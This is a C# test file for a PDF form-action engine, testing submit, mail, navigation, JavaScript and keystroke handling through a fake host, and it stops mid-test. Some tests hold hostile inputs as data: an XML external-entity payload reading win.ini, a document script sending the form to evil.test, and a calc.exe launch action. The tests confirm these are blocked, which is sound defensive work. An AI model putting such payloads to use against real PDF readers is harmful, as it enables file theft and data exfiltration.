using System.Text;
using InkvoltPdf.Core;
using PdfSharp.Pdf;

namespace InkvoltPdf.Tests;

/// <summary>Widget actions (FormEditor.RunAction), the JavaScript action API, data formats and live keystrokes, with a fake host.</summary>
public class FormActionTests
{
    private const string W = "/Type /Annot /Subtype /Widget /F 4 /P 4 0 R";

    /// <summary>
    /// A form on page 1 of <paramref name="pages"/> pages: objects 1 catalog, 2 pages, 3 Helvetica, 4.. the pages, then
    /// the fields (from <see cref="FieldObject"/>), then <paramref name="more"/>.
    /// </summary>
    private static byte[] Doc(IReadOnlyList<string> fields, int pages = 1, IReadOnlyList<string>? more = null, string catalogExtra = "")
    {
        var first = 4 + pages;
        var refs = string.Join(' ', Enumerable.Range(first, fields.Count).Select(i => $"{i} 0 R"));
        var pageRefs = string.Join(' ', Enumerable.Range(4, pages).Select(i => $"{i} 0 R"));
        var objects = new List<string>
        {
            $"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [{refs}] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 3 0 R >> >> >> {catalogExtra} >>",
            $"<< /Type /Pages /Kids [{pageRefs}] /Count {pages} >>",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
        };
        for (var p = 0; p < pages; p++)
            objects.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] {(p == 0 ? $"/Annots [{refs}]" : "")} /Resources << >> >>");
        objects.AddRange(fields);
        if (more is not null) objects.AddRange(more);
        return Core2Pdf.Build(objects);
    }

    private static string Rect(int row) => $"72 {700 - row * 30} 250 {720 - row * 30}";

    private static string Text(string name, int row, string extra = "") => $"<< {W} /FT /Tx /T ({name}) /Rect [{Rect(row)}] /DA (/Helv 10 Tf 0 g) {extra} >>";

    private static string Button(string name, int row, string action) => $"<< {W} /FT /Btn /Ff 65536 /T ({name}) /Rect [{Rect(row)}] /A {action} >>";

    private static string Js(string script) => $"<< /S /JavaScript /JS ({script}) >>";

    private sealed class FakeHost : IFormActionHost
    {
        public int Page { get; set; }
        public List<string> Calls { get; } = [];
        public List<FormSubmission> Submits { get; } = [];
        public List<FormAlert> Alerts { get; } = [];
        public List<FormMail> Mails { get; } = [];
        public int AlertAnswer { get; set; } = 1;
        public string? Answer { get; set; }
        public byte[]? ImportBytes { get; set; }

        public int CurrentPage => Page;

        public void GoToPage(int page, double? y)
        {
            Page = page;
            Calls.Add($"goto {page}");
        }

        /// <summary>The answer to consent: false = the user declines every outward step.</summary>
        public bool Allow { get; set; } = true;

        public bool OpenUrl(string url)
        {
            Calls.Add($"url {url}");
            return Allow;
        }

        public Task<int>? Submit(FormSubmission submission)
        {
            Submits.Add(submission);
            return Allow ? Task.FromResult(200) : null;
        }

        public bool Mail(FormMail mail)
        {
            Mails.Add(mail);
            return Allow;
        }
        public void Print(int? fromPage, int? toPage) => Calls.Add("print");

        public int Alert(FormAlert alert)
        {
            Alerts.Add(alert);
            return AlertAnswer;
        }

        public string? Response(FormPrompt prompt)
        {
            Calls.Add($"response {prompt.Question}");
            return Answer;
        }

        public bool OpenRemote(string path, int page)
        {
            Calls.Add($"remote {path} {page}");
            return Allow;
        }

        public bool Launch(string path)
        {
            Calls.Add($"launch {path}");
            return Allow;
        }
        public void Named(string name) => Calls.Add($"named {name}");

        public byte[]? ImportData(string? suggestedPath)
        {
            Calls.Add($"import {suggestedPath}");
            return ImportBytes;
        }

        public void Beep(int type) => Calls.Add($"beep {type}");
    }

    private static FormActionResult Run(byte[] doc, string field, FakeHost host, FormTrigger trigger = FormTrigger.Click)
    {
        var w = FormEditor.Read(doc, null).First(x => x.FieldName == field);
        return FormEditor.RunAction(doc, null, field, w.PageIndex, w.AnnotIndex, trigger, host);
    }

    private static string ValueOf(byte[] data, string name) => FormEditor.Read(data, null).First(w => w.FieldName == name).Value;

    private static PdfDictionary FieldDict(PdfDocument doc, string name) => Core2Pdf.Field(doc, name)!;

    // ---------------- Reading ----------------

    [Fact]
    public void ReadReportsTriggersPositionAndSignedState()
    {
        var doc = Doc([
            Button("go", 0, "<< /S /Named /N /NextPage >>"),
            Text("num", 1, "/AA << /K << /S /JavaScript /JS (AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);) >> /Fo << /S /JavaScript /JS (1;) >> >>"),
            $"<< {W} /FT /Sig /T (sig) /Rect [{Rect(2)}] /V << /Type /Sig /Filter /Adobe.PPKLite >> >>",
            $"<< {W} /FT /Sig /T (blank) /Rect [{Rect(3)}] >>",
        ]);
        var widgets = FormEditor.Read(doc, null);
        var go = widgets.First(w => w.FieldName == "go");
        Assert.Equal(FormFieldKind.PushButton, go.Kind);
        Assert.Equal(FormTriggers.Up, go.Triggers);
        Assert.Equal(0, go.AnnotIndex);
        var num = widgets.First(w => w.FieldName == "num");
        Assert.Equal(FormTriggers.Keystroke | FormTriggers.Focus, num.Triggers);
        Assert.Equal(1, num.AnnotIndex);
        Assert.True(widgets.First(w => w.FieldName == "sig").Signed);
        Assert.False(widgets.First(w => w.FieldName == "blank").Signed);
    }

    // ---------------- ResetForm ----------------

    [Fact]
    public void ResetButtonPutsFieldsBackToTheirDefaults()
    {
        var doc = Doc([
            Text("a", 0, "/V (typed) /DV (default)"),
            Text("b", 1, "/V (other)"),
            Button("reset", 2, "<< /S /ResetForm >>"),
        ]);
        var host = new FakeHost();
        var r = Run(doc, "reset", host);
        Assert.NotNull(r.Data);
        Assert.Equal("Reset form", r.Label);
        Assert.Equal("default", ValueOf(r.Data!, "a"));
        Assert.Equal("", ValueOf(r.Data!, "b"));
        // The reset value also shows: the appearance was rebuilt.
        Assert.Contains("default", Core2Pdf.AllText(Core2Pdf.WithoutNeedAppearances(r.Data!)));
    }

    [Fact]
    public void ResetFormHonorsFieldsAndTheExcludeFlag()
    {
        var fields = new[] { Text("a", 0, "/V (1)"), Text("b", 1, "/V (2)") };
        var include = Run(Doc([.. fields, Button("r", 2, "<< /S /ResetForm /Fields [(a)] >>")]), "r", new FakeHost()).Data!;
        Assert.Equal(("", "2"), (ValueOf(include, "a"), ValueOf(include, "b")));
        var exclude = Run(Doc([.. fields, Button("r", 2, "<< /S /ResetForm /Fields [(a)] /Flags 1 >>")]), "r", new FakeHost()).Data!;
        Assert.Equal(("1", ""), (ValueOf(exclude, "a"), ValueOf(exclude, "b")));
    }

    // ---------------- SubmitForm ----------------

    private static byte[] SubmitDoc(int flags, string fields = "") => Doc([
        Text("a", 0, "/V (x)"),
        Text("b", 1, "/V (hello world)"),
        Text("c", 2),
        Button("send", 3, $"<< /S /SubmitForm /F << /FS /URL /F (https://example.test/form) >> /Flags {flags} {fields} >>"),
    ]);

    [Fact]
    public void SubmitSendsFdfByDefault()
    {
        var host = new FakeHost();
        var r = Run(SubmitDoc(0), "send", host);
        Assert.Null(r.Data); // nothing in the document changed
        var s = Assert.Single(host.Submits);
        Assert.Equal(("https://example.test/form", "POST", "application/vnd.fdf", SubmitFormat.Fdf, 2), (s.Url, s.Method, s.ContentType, s.Format, s.FieldCount));
        var body = Encoding.Latin1.GetString(s.Body);
        Assert.StartsWith("%FDF-1.2", body);
        Assert.Contains("/T (a) /V (x)", body);
        var parsed = FormData.Parse(s.Body)!;
        Assert.Equal(["x"], parsed["a"]);
        Assert.Equal(["hello world"], parsed["b"]);
        Assert.False(parsed.ContainsKey("c")); // no value, not asked for
    }

    [Fact]
    public void SubmitSendsXfdfHtmlAndPdfPerFlags()
    {
        var host = new FakeHost();
        Run(SubmitDoc(32), "send", host);
        var xfdf = host.Submits[^1];
        Assert.Equal(("application/vnd.adobe.xfdf", SubmitFormat.Xfdf), (xfdf.ContentType, xfdf.Format));
        var xml = Encoding.UTF8.GetString(xfdf.Body);
        Assert.Contains("<field name=\"a\"><value>x</value></field>", xml);
        Assert.Equal(["hello world"], FormData.Parse(xfdf.Body)!["b"]);

        Run(SubmitDoc(4), "send", host);
        var post = host.Submits[^1];
        Assert.Equal(("POST", "application/x-www-form-urlencoded"), (post.Method, post.ContentType));
        Assert.Equal("a=x&b=hello+world", Encoding.ASCII.GetString(post.Body));

        Run(SubmitDoc(4 | 8), "send", host);
        var get = host.Submits[^1];
        Assert.Equal(("GET", "https://example.test/form?a=x&b=hello+world"), (get.Method, get.Url));
        Assert.Empty(get.Body);

        Run(SubmitDoc(256), "send", host);
        var pdf = host.Submits[^1];
        Assert.Equal(("application/pdf", SubmitFormat.Pdf), (pdf.ContentType, pdf.Format));
        Assert.StartsWith("%PDF", Encoding.Latin1.GetString(pdf.Body, 0, 8));
    }

    [Fact]
    public void SubmitIncludesExcludesAndEmptyFieldsPerFlags()
    {
        var host = new FakeHost();
        Run(SubmitDoc(4 | 2, "/Fields [(a) (c)]"), "send", host);
        Assert.Equal("a=x&c=", Encoding.ASCII.GetString(host.Submits[^1].Body));
        Run(SubmitDoc(4 | 1, "/Fields [(a)]"), "send", host);
        Assert.Equal("b=hello+world", Encoding.ASCII.GetString(host.Submits[^1].Body));
        Assert.Equal(1, host.Submits[^1].FieldCount);
    }

    [Fact]
    public void FdfNestsHierarchicalNamesAndRoundTripsUnicode()
    {
        var entries = new List<FormData.Entry>
        {
            new("person.name", ["Zoë (née) \\ Ünal"], false),
            new("person.agree", ["Yes"], true),
            new("colors", ["red", "blue"], false),
        };
        var fdf = FormData.Fdf(entries, "form.pdf");
        Assert.Contains("/T (person) /Kids [", Encoding.Latin1.GetString(fdf));
        var back = FormData.Parse(fdf)!;
        Assert.Equal(["Zoë (née) \\ Ünal"], back["person.name"]);
        Assert.Equal(["Yes"], back["person.agree"]);
        Assert.Equal(["red", "blue"], back["colors"]);
        var xback = FormData.Parse(FormData.Xfdf(entries, null))!;
        Assert.Equal(back.OrderBy(k => k.Key).Select(k => (k.Key, string.Join('|', k.Value))), xback.OrderBy(k => k.Key).Select(k => (k.Key, string.Join('|', k.Value))));
        Assert.Null(FormData.Parse(Encoding.ASCII.GetBytes("<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///c:/windows/win.ini'>]><xfdf>&e;</xfdf>")));
        Assert.Null(FormData.Parse(Encoding.ASCII.GetBytes("MZ not form data")));
    }

    [Fact]
    public void JavaScriptSubmitTakesTheObjectAndPositionalForms()
    {
        var host = new FakeHost();
        var doc = Doc([
            Text("a", 0, "/V (x)"),
            Text("b", 1, "/V (y)"),
            Button("obj", 2, Js("this.submitForm({cURL: 'https://example.test/o', cSubmitAs: 'XFDF', aFields: ['a']});")),
            Button("pos", 3, Js("this.submitForm('https://example.test/p', false, false, 'b');")),
            Button("pdf", 4, Js("this.submitForm({cURL: 'https://example.test/d', bPDF: true});")),
        ]);
        Run(doc, "obj", host);
        Run(doc, "pos", host);
        Run(doc, "pdf", host);
        Assert.Equal(3, host.Submits.Count);
        Assert.Equal(("https://example.test/o", SubmitFormat.Xfdf, 1), (host.Submits[0].Url, host.Submits[0].Format, host.Submits[0].FieldCount));
        Assert.Equal(["x"], FormData.Parse(host.Submits[0].Body)!["a"]);
        Assert.Equal(("https://example.test/p", SubmitFormat.Html, "b=y"), (host.Submits[1].Url, host.Submits[1].Format, Encoding.ASCII.GetString(host.Submits[1].Body)));
        Assert.Equal(SubmitFormat.Pdf, host.Submits[2].Format);
    }

    // ---------------- Navigation, chains, hide ----------------

    [Fact]
    public void NamedActionsAndNextChainsNavigate()
    {
        var doc = Doc([
            Button("next", 0, "<< /S /Named /N /NextPage /Next << /S /Named /N /NextPage >> >>"),
            Button("last", 1, "<< /S /Named /N /LastPage /Next [<< /S /Named /N /PrevPage >> << /S /Named /N /Print >>] >>"),
            Button("first", 2, "<< /S /Named /N /FirstPage /Next << /S /GoTo /D [6 0 R /Fit] /Next << /S /URI /URI (https://example.test/) >> >> >>"),
        ], pages: 4);
        var host = new FakeHost();
        Run(doc, "next", host);
        Assert.Equal(2, host.Page);
        Run(doc, "next", host);
        Assert.Equal(3, host.Page); // clamped to the last page
        Run(doc, "last", host);
        Assert.Equal(2, host.Page);
        Assert.Contains("named Print", host.Calls);
        Run(doc, "first", host);
        Assert.Equal(["goto 0", "goto 2", "url https://example.test/"], host.Calls.TakeLast(3));
    }

    [Fact]
    public void HideActionTogglesTheWidgetsHiddenFlag()
    {
        var doc = Doc([
            Text("a", 0, "/V (x)"),
            Button("hide", 1, "<< /S /Hide /T (a) >>"),
            Button("show", 2, "<< /S /Hide /T [(a)] /H false >>"),
        ]);
        var hidden = Run(doc, "hide", new FakeHost()).Data!;
        Assert.DoesNotContain(FormEditor.Read(hidden, null), w => w.FieldName == "a");
        var shown = Run(hidden, "show", new FakeHost()).Data!;
        Assert.Equal("x", ValueOf(shown, "a"));
    }

    [Fact]
    public void LaunchRemoteAndImportGoThroughTheHost()
    {
        var import = FormData.Fdf([new FormData.Entry("a", ["imported"], false)], null);
        var host = new FakeHost { ImportBytes = import };
        var doc = Doc([
            Text("a", 0),
            Button("launch", 1, "<< /S /Launch /F (calc.exe) >>"),
            Button("remote", 2, "<< /S /GoToR /F (other.pdf) /D [3 /Fit] >>"),
            Button("import", 3, "<< /S /ImportData /F (data.fdf) >>"),
        ]);
        Run(doc, "launch", host);
        Run(doc, "remote", host);
        var r = Run(doc, "import", host);
        Assert.Equal(["launch calc.exe", "remote other.pdf 3", "import data.fdf"], host.Calls);
        Assert.Equal("Import form data", r.Label);
        Assert.Equal("imported", ValueOf(r.Data!, "a"));

        // Declined (no file): nothing changes.
        Assert.Null(Run(doc, "import", new FakeHost()).Data);
    }

    // ---------------- JavaScript API ----------------

    [Fact]
    public void AlertsAreModalRateLimitedAndReturnTheChoice()
    {
        var host = new FakeHost { AlertAnswer = 4 };
        var doc = Doc([
            Text("a", 0, "/V (x)"),
            Button("spam", 1, Js("for (var i = 0; i < 6; i++) app.alert('m' + i);")),
            Button("ask", 2, Js("if (app.alert({cMsg: 'Clear?', nIcon: 2, nType: 2, cTitle: 'Form'}) == 4) this.resetForm(['a']);")),
        ]);
        var r = Run(doc, "spam", host);
        Assert.Equal(["m0", "m1", "m2"], host.Alerts.Select(a => a.Message));
        Assert.Contains(r.Log, l => l.Contains("suppressed", StringComparison.Ordinal));
        Assert.Empty(r.Alerts); // shown as dialogs, not repeated as toasts

        var cleared = Run(doc, "ask", host);
        Assert.Equal(new FormAlert("Clear?", "Form", 2, 2), host.Alerts[^1]);
        Assert.Equal("", ValueOf(cleared.Data!, "a"));
        host.AlertAnswer = 3; // No
        Assert.Null(Run(doc, "ask", host).Data);
    }

    [Fact]
    public void ScriptsNavigatePromptFocusAndChangeFieldLooks()
    {
        var host = new FakeHost { Answer = "Bob" };
        var doc = Doc([
            Text("a", 0),
            Text("b", 1),
            $"<< {W} /FT /Ch /Ff 131072 /T (c) /Rect [{Rect(2)}] /DA (/Helv 10 Tf 0 g) /Opt [(x)] >>",
            Button("go", 3, Js("getField('a').value = app.response('Name?') + '|' + this.numPages + '|' + util.printx('(999) 999-9999', '5551234567') + '|' + AFExactMatch([/[a-z]+/, /[0-9]+/], '123'); " +
                "this.pageNum = 2; getField('b').setFocus(); app.beep(1); " +
                "var f = getField('b'); f.readonly = true; f.fillColor = color.red; f.textColor = ['RGB', 0, 0, 1]; " +
                "getField('c').setItems([['One', '1'], ['Two', '2']]); getField('c').insertItemAt('Zero', '0', 0); getField('c').deleteItemAt(2);")),
        ], pages: 3);
        var r = Run(doc, "go", host);
        Assert.Equal("Bob|3|(555) 123-4567|2", ValueOf(r.Data!, "a"));
        Assert.Equal(2, host.Page);
        Assert.Equal("b", r.FocusField);
        Assert.Contains("beep 1", host.Calls);
        var widgets = FormEditor.Read(r.Data!, null);
        Assert.True(widgets.First(w => w.FieldName == "b").ReadOnly);
        var c = widgets.First(w => w.FieldName == "c");
        Assert.Equal(["0", "1"], c.Options);
        Assert.Equal(["Zero", "One"], c.OptionLabels!);
        using var pdf = Core2Pdf.Open(r.Data!);
        var b = FieldDict(pdf, "b");
        var bg = b.Elements.GetDictionary("/MK")!.Elements.GetArray("/BG")!;
        Assert.Equal([1.0, 0, 0], Enumerable.Range(0, 3).Select(i => PdfObj.Num(bg, i)));
        Assert.Contains("0 0 1 rg", b.Elements.GetString("/DA"));
    }

    [Fact]
    public void FocusAndBlurRunTheirActions()
    {
        var doc = Doc([
            Text("a", 0, "/AA << /Fo << /S /JavaScript /JS (getField\\('b'\\).value = 'focused';) >> /Bl << /S /JavaScript /JS (getField\\('b'\\).value = 'left';) >> >>"),
            Text("b", 1),
        ]);
        Assert.Equal("focused", ValueOf(Run(doc, "a", new FakeHost(), FormTrigger.Focus).Data!, "b"));
        Assert.Equal("left", ValueOf(Run(doc, "a", new FakeHost(), FormTrigger.Blur).Data!, "b"));
        Assert.Null(Run(doc, "a", new FakeHost(), FormTrigger.Enter).Data); // no enter action
    }

    [Fact]
    public void OutwardCallsNeverRunFromDocumentScriptsOrWithoutAHost()
    {
        var doc = Doc([
            Text("a", 0, "/V (x)"),
            Button("noop", 1, Js("getField('a').value = typeof this.importDataObject + typeof app.openDoc + typeof Net;")),
        ], catalogExtra: "/Names << /JavaScript << /Names [(evil) << /S /JavaScript /JS (this.submitForm\\('https://evil.test/'\\); app.launchURL\\('https://evil.test/'\\); this.mailDoc\\(\\); this.print\\(\\); app.alert\\('hi'\\);) >>] >> >>");
        var host = new FakeHost();
        var r = Run(doc, "noop", host);
        Assert.Empty(host.Submits);
        Assert.Empty(host.Calls);
        Assert.Empty(host.Mails);
        Assert.Empty(host.Alerts);
        Assert.Equal("undefinedundefinedundefined", ValueOf(r.Data!, "a"));

        // Fill without a host (reading, tests): submitForm and friends quietly do nothing.
        var fill = FormEditor.Fill(Doc([Text("a", 0, "/AA << /V << /S /JavaScript /JS (this.submitForm\\('https://x.test/'\\); app.launchURL\\('https://x.test/'\\);) >> >>")]), null,
            new Dictionary<string, string> { ["a"] = "1" });
        Assert.Equal("1", ValueOf(fill.Data, "a"));
    }

    [Fact]
    public void MailDocAttachesTheFinishedDocument()
    {
        var host = new FakeHost();
        var doc = Doc([
            Text("a", 0),
            Button("mail", 1, Js("getField('a').value = 'filled'; this.mailDoc({cTo: 'clerk@example.test', cSubject: 'Form'}); this.mailForm(false, 'x@example.test');")),
        ]);
        var r = Run(doc, "mail", host);
        Assert.Equal(2, host.Mails.Count);
        var form = host.Mails.Single(m => m.AttachmentName == "form.fdf");
        Assert.Equal(["filled"], FormData.Parse(form.Attachment!)!["a"]);
        var whole = host.Mails.Single(m => m.AttachmentName == "form.pdf");
        Assert.Equal(("clerk@example.test", "Form"), (whole.To, whole.Subject));
        Assert.Equal(r.Data, whole.Attachment); // the saved document, with the script's change
        Assert.Equal("filled", ValueOf(whole.Attachment!, "a"));
    }

    // ---------------- Live keystrokes ----------------

    private static FieldKeystrokes Keys(string script)
    {
        var doc = Doc([Text("f", 0, $"/AA << /K << /S /JavaScript /JS ({script}) >> >>")]);
        return FieldKeystrokes.Open(doc, null, "f")!;
    }

    [Fact]
    public void NumberKeystrokesRejectLetters()
    {
        using var keys = Keys("AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);");
        Assert.False(keys.Run("12", "a", 2, 2)!.Accepted);
        var ok = keys.Run("12", "3", 2, 2)!;
        Assert.Equal((true, "3", 2, 2), (ok.Accepted, ok.Change, ok.SelStart, ok.SelEnd));
        Assert.True(keys.Run("123", "", 2, 3)!.Accepted); // backspace
        Assert.Null(FieldKeystrokes.Open(Doc([Text("f", 0)]), null, "f")); // no keystroke script
    }

    [Fact]
    public void SpecialKeystrokesFormatPhoneNumbersAsTyped()
    {
        using var phone = Keys("AFSpecial_Keystroke\\(2\\);");
        var r = phone.Run("555", "1", 3, 3)!;
        Assert.Equal((true, "555-1", 0, 3), (r.Accepted, r.Change, r.SelStart, r.SelEnd));
        r = phone.Run("555-1234", "5", 8, 8)!;
        Assert.Equal("(555) 123-45", r.Change);
        Assert.False(phone.Run("555", "x", 3, 3)!.Accepted);

        using var mask = Keys("AFSpecial_KeystrokeEx\\('99-AA'\\);");
        r = mask.Run("12", "x", 2, 2)!;
        Assert.Equal((true, "-x"), (r.Accepted, r.Change));
        Assert.False(mask.Run("12", "3", 2, 2)!.Accepted);

        using var upper = Keys("event.change = event.change.toUpperCase\\(\\);");
        Assert.Equal("ABC", upper.Run("", "abc", 0, 0)!.Change);
    }

    [Fact]
    public void KeystrokeScriptsCannotChangeTheFormOrReachOut()
    {
        using var keys = Keys("getField\\('f'\\).value = 'hacked'; this.submitForm\\('https://x.test/'\\); app.launchURL\\('https://x.test/'\\);");
        Assert.True(keys.Run("a", "b", 1, 1)!.Accepted); // runs, but writes and outward calls go nowhere
    }

    [Fact]
    public void KeystrokeEngineStartsWhenOpenedNotOnTheFirstKeystroke()
    {
        using var keys = Keys("AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);");
        Assert.True(keys.Warm);
    }

    [Fact]
    public void EditDiffAndLengthFit()
    {
        Assert.Equal((3, 3, "4"), FieldKeystrokes.Diff("123", "1234"));
        Assert.Equal((1, 3, ""), FieldKeystrokes.Diff("1234", "14"));
        Assert.Equal((0, 4, "(555) "), FieldKeystrokes.Diff("555-1234", "(555) 1234")); // only what differs
        Assert.Equal((3, 3, "-"), FieldKeystrokes.Diff("5551", "555-1"));
        Assert.Equal((0, 2, "b"), FieldKeystrokes.Diff("\U0001F600", "b")); // a surrogate pair is never split
        Assert.Equal("ab", FieldKeystrokes.Fit("123", 3, 3, "abcdef", 5));
        Assert.Equal("abc", FieldKeystrokes.Fit("123", 1, 3, "abcdef", 4));
        Assert.Equal("abcdef", FieldKeystrokes.Fit("123", 3, 3, "abcdef", 0));
        Assert.Equal("", FieldKeystrokes.Fit("12345", 5, 5, "x", 5));
        Assert.Equal("a", FieldKeystrokes.Fit("123", 3, 3, "a\U0001F600", 5)); // the pair doesn't fit whole: left out
    }

    // ---------------- Outward caps, consent and hover ----------------

    [Fact]
    public void OutwardCallsAreCappedPerRunAndTheScriptStops()
    {
        var host = new FakeHost();
        var doc = Doc([
            Text("a", 0),
            Button("loop", 1, Js("for \\(;;\\) app.launchURL\\('https://x.test/'\\);")),
        ]);
        var r = Run(doc, "loop", host);
        Assert.Equal(3, host.Calls.Count(c => c.StartsWith("url ", StringComparison.Ordinal)));
        Assert.Contains(r.Alerts, a => a.Contains("stopped", StringComparison.Ordinal));
        Assert.Contains(r.Log, l => l.Contains("too many outward", StringComparison.Ordinal));
    }

    [Fact]
    public void OutwardCallsAreCappedPerDocumentPerMinute()
    {
        var host = new FakeHost();
        var doc = Doc([Button("two", 0, Js("app.launchURL\\('https://x.test/1'\\); app.mailMsg\\(false, 'a@x.test'\\);"))]);
        var notices = new List<int>();
        for (var i = 0; i < 4; i++) notices.Add(Run(doc, "two", host).Alerts.Count);
        Assert.Equal(6, host.Calls.Count(c => c.StartsWith("url ", StringComparison.Ordinal)) + host.Mails.Count);
        Assert.Equal([0, 0, 0, 1], notices);
        // Another document (another host) has its own allowance.
        var other = new FakeHost();
        Run(doc, "two", other);
        Assert.Single(other.Mails);
    }

    [Fact]
    public void DeclinedConsentStopsTheScriptAndTheActionChain()
    {
        var host = new FakeHost { Allow = false };
        var doc = Doc([
            Text("a", 0, "/V (before)"),
            Button("js", 1, Js("app.launchURL\\('https://x.test/1'\\); getField\\('a'\\).value = 'after'; app.launchURL\\('https://x.test/2'\\);")),
            Button("chain", 2, "<< /S /URI /URI (https://x.test/3) /Next << /S /JavaScript /JS (getField\\('a'\\).value = 'next';) >> >>"),
            Button("send", 3, Js("this.submitForm\\('https://x.test/s'\\); getField\\('a'\\).value = 'sent';")),
        ]);
        var r = Run(doc, "js", host);
        Assert.Equal(["url https://x.test/1"], host.Calls);
        Assert.Null(r.Data);
        Assert.Contains(r.Log, l => l.Contains("stopped", StringComparison.Ordinal));
        Assert.Null(Run(doc, "chain", host).Data);
        Assert.Null(Run(doc, "send", host).Data);
        Assert.Single(host.Submits);
        // Allowed, the same scripts carry on.
        Assert.Equal("after", ValueOf(Run(doc, "js", new FakeHost()).Data!, "a"));
    }

    [Fact]
    public void AlwaysAllowCoversTheDestinationAndWhatIsSent()
    {
        FormSubmission Sub(string url, SubmitFormat format, params string[] fields) => new(url, "POST", "x", [], format, fields.Length, fields);
        var fdf = FormConsent.SubmitKey(Sub("https://x.test/s?a=1", SubmitFormat.Fdf, "a", "b"));
        Assert.Equal(fdf, FormConsent.SubmitKey(Sub("https://x.test/s?a=2", SubmitFormat.Fdf, "b", "a")));
        Assert.NotEqual(fdf, FormConsent.SubmitKey(Sub("https://x.test/s", SubmitFormat.Fdf, "a", "b", "ssn")));
        Assert.NotEqual(fdf, FormConsent.SubmitKey(Sub("https://x.test/s", SubmitFormat.Pdf, "a", "b")));
        Assert.NotEqual(fdf, FormConsent.SubmitKey(Sub("https://x.test/t", SubmitFormat.Fdf, "a", "b")));
        Assert.NotEqual(fdf, FormConsent.SubmitKey(Sub("https://x.test/s", SubmitFormat.Fdf, "a", "b") with { Method = "GET" }));

        var msg = new FormMail("a@x.test; B@x.test", "", "", "Hi", "", null, null);
        Assert.Equal(FormConsent.MailKey(msg), FormConsent.MailKey(msg with { To = "b@x.test,a@x.test", Subject = "Other" }));
        Assert.NotEqual(FormConsent.MailKey(msg), FormConsent.MailKey(msg with { Bcc = "spy@x.test" }));
        var data = msg with { Attachment = [1], AttachmentName = "form.fdf", Fields = ["a"] };
        var pdf = msg with { Attachment = [1], AttachmentName = "form.pdf" };
        Assert.Equal(3, new[] { FormConsent.MailKey(msg), FormConsent.MailKey(data), FormConsent.MailKey(pdf) }.Distinct().Count());
        Assert.NotEqual(FormConsent.MailKey(data), FormConsent.MailKey(data with { Fields = ["a", "b"] }));
    }

    [Fact]
    public void SubmitsAndMailsSayWhichFieldsTheyCarry()
    {
        var host = new FakeHost();
        var doc = Doc([
            Text("a", 0, "/V (1)"),
            Text("b", 1, "/V (2)"),
            Button("go", 2, Js("this.submitForm\\({cURL: 'https://x.test/s', aFields: ['a']}\\); this.mailForm\\(false, 'z@x.test'\\);")),
        ]);
        Run(doc, "go", host);
        Assert.Equal(["a"], host.Submits.Single().Fields);
        Assert.Equal(["a", "b"], host.Mails.Single().Fields);
    }

    [Fact]
    public void SetFocusFromFocusOrBlurScriptsIsIgnored()
    {
        var doc = Doc([
            Text("a", 0, "/AA << /Fo << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> /Bl << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> " +
                "/U << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> >>"),
            Text("b", 1, "/AA << /Fo << /S /JavaScript /JS (getField\\('a'\\).setFocus\\(\\);) >> >>"),
        ]);
        var host = new FakeHost();
        Assert.Null(Run(doc, "a", host, FormTrigger.Focus).FocusField);
        Assert.Null(Run(doc, "a", host, FormTrigger.Blur).FocusField);
        Assert.Null(Run(doc, "b", host, FormTrigger.Focus).FocusField);
        Assert.Equal("b", Run(doc, "a", host, FormTrigger.Up).FocusField); // a click may still move it
    }

    [Fact]
    public void HoverRunsScriptsWithoutDialogsPrintingOrOutwardActions()
    {
        var host = new FakeHost();
        var enter = Js("app.alert\\('hi'\\); app.response\\('?'\\); print\\(\\); app.launchURL\\('https://x.test/'\\); this.resetForm\\(\\); " +
            "getField\\('a'\\).display = display.hidden;");
        var exit = "<< /S /Named /N /Print /Next [<< /S /Named /N /NextPage >> << /S /URI /URI (https://x.test/u) >> << /S /SubmitForm /F (https://x.test/s) >>] >>";
        var doc = Doc([
            Text("a", 0, "/V (keep)"),
            $"<< {W} /FT /Btn /Ff 65536 /T (hover) /Rect [{Rect(1)}] /AA << /E {enter} /X {exit} >> >>",
        ], pages: 2);
        var r = Run(doc, "hover", host, FormTrigger.Enter);
        Assert.Empty(host.Alerts);
        Assert.Empty(host.Calls);
        Assert.Empty(r.Alerts);
        Assert.NotNull(r.Data); // the harmless part (hiding a field) still happened
        Assert.DoesNotContain(FormEditor.Read(r.Data!, null), w => w.FieldName == "a");
        Assert.Contains(r.Log, l => l.Contains("resetForm ignored", StringComparison.Ordinal));

        Run(doc, "hover", host, FormTrigger.Exit);
        Assert.Equal(["goto 1"], host.Calls); // only the navigation
        Assert.Empty(host.Submits);

        // Clicked, the same script may open dialogs.
        var click = new FakeHost();
        var clickDoc = Doc([Text("a", 0), $"<< {W} /FT /Btn /Ff 65536 /T (b) /Rect [{Rect(1)}] /A {enter} >>"]);
        Run(clickDoc, "b", click);
        Assert.Single(click.Alerts);
    }

    // ---------------- Check boxes and radios with /Opt ----------------

    /// <summary>
    /// A radio group "r" whose two widgets (states /0 and /1) export the same non-ASCII value "Été" through /Opt (as
    /// Acrobat writes it), a check box "cb" exporting "Oui" for state /0, a text field "a" and a button "go".
    /// </summary>
    private static byte[] OptForm(string script, string radioValue = "/1", string checkValue = "/0")
    {
        // Objects: 5 a, 6 r, 7 cb, 8 go, 9-10 r's widgets, 11 the appearance.
        string Kid(string state, int row) =>
            $"<< {W} /Parent 6 0 R /Rect [{Rect(row)}] /AS /{(radioValue == "/" + state ? state : "Off")} /AP << /N << /{state} 11 0 R /Off 11 0 R >> >> >>";
        return Doc([
            Text("a", 0),
            $"<< /FT /Btn /Ff 49152 /T (r) /Opt [(Été) (Été)] /V {radioValue} /Kids [9 0 R 10 0 R] >>",
            $"<< {W} /FT /Btn /T (cb) /Rect [{Rect(3)}] /Opt [(Oui)] /V {checkValue} /AS {checkValue} /AP << /N << /0 11 0 R /Off 11 0 R >> >> >>",
            Button("go", 4, Js(script)),
        ], more: [Kid("0", 1), Kid("1", 2), Core2Pdf.Stream("")]);
    }

    [Fact]
    public void OptExportValuesAreWhatScriptsSee()
    {
        var host = new FakeHost();
